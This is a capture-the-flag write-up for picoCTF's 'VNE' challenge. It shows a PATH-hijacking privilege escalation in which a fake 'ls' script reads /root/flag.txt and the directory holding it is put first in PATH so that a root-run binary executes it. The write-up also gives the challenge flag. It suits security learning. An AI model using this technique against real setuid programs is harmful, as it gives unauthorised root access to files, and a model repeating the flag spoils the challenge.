# VNE

**200 points**

AUTHOR: JUNIAS BONOU

Description
We've got a binary that can list directories as root, try it out !!
Additional details will be available after launching your challenge instance.

*Note:* This challenge launches an instance on demand.

___

First the script expects us to have an environment variable set for SECRET_DIR.

There are two potential directories that have the same flag (I checked): 

```
/challenge
/root
```

I originally picked `/root`.

Running the program it gives returns:

```
Listing the content of /root as root:
flag.txt
```

Now the fun part, hint 2 tells us to "Find a way to add more instructions to the ls".

First I tried using alias --> nada,

I tried using function ls() --> nada.

And on and on, until I tried the following.

I made a script called `ls` using `cat >> ls` and typed the code:

```bash
#!/bin/bash

/bin/ls
/bin/cat /root/flag.txt
```

Then I made it executable with `chmod +x ls`.

Finally to trick the shell into running this version of `ls` instead of the builtin way we add the path to the current directory as the first directory that the shell will look for its commands with:

```bash
export PATH=/home/ctf-player/:$PATH
```

NOW, when running the script, it runs in the background the `ls` command and it looks at the PATH and sees a file called `ls` inside the first directory `/home/ctf-player` and executes its code with root privileges and we get the flag:

> picoCTF{Power_t0_man!pul4t3_3nv_fc3ff2c9}
